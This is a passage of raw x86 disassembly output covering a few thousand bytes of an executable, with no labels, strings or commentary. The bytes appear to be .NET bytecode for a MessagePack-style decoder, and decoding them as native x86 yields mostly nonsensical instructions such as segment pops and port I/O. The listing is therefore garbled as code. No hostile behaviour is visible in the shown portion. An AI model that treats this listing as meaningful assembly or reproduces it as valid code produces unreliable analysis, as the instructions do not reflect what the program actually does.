  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 6a             	add    %dh,0x6a(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 96             	add    %dh,-0x6a(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
